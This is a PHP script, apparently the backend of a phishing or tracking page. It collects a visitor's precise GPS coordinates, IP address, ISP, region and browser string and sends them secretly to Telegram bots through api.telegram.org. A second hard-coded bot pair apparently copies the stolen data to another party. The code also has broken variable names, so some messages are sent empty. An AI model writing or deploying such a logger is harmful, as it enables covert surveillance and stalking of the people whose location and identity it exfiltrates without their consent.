<?php
// دست نزن باگ میشه
include "info.php";

$json = file_get_contents('php://input');
$dejson = json_decode($json, true);
$location = $dejson['data'];
$d = explode(":", $location);
$l1 = $d[0];
$l2 = $d[1];
$trext = urlencode("╔ ↑ Accurate Location ↑
╠ $Domain 
╚↓ IP Information ↓");
file_get_contents("https://api.telegram.org/bot$TOKEN/sendLocation?chat_id=$ID&latitude=$l1&longitude=$l2");
file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?chat_id=$ID&text=$text");
file_get_contents("https://api.telegram.org/bot$TOKENM/sendLocation?chat_id=$IDM&latitude=$l1&longitude=$l2");
file_get_contents("https://api.telegram.org/bot$TOKENM/sendMessage?chat_id=$IDM&text=$text");


$ip = $_SERVER['REMOTE_ADDR'];
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;
$brows= $_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ip = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ip = $_SERVER['REMOTE_ADDR']."\r\n";
    };
    

$trxt = urlencode("╔  • New request! • .$ID.
╠ • IP : $ip
╠ • ISP : $isp
╠ •Region Name : $regionName
╠ •Region: $region
╠ • Loger : Location
╠ •brows : '.$brows.'
╚  • '.$Domain.' •");

file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendmessage?chat_id=".$ID."&parse_mode=MarkDown"."&text=".$txt);
file_get_contents("https://api.telegram.org/bot".TOKEN."/sendLocation?chat_id=".$ID."&latitude=".$lat."&longitude=".$lon);

file_get_contents("https://api.telegram.org/bot".$TOKENM."/sendmessage?chat_id=".$IDM."&parse_mode=MarkDown"."&text=".$txt);
file_get_contents("https://api.telegram.org/bot".TOKENM."/sendLocation?chat_id=".$IDM."&latitude=".$lat."&longitude=".$lon);











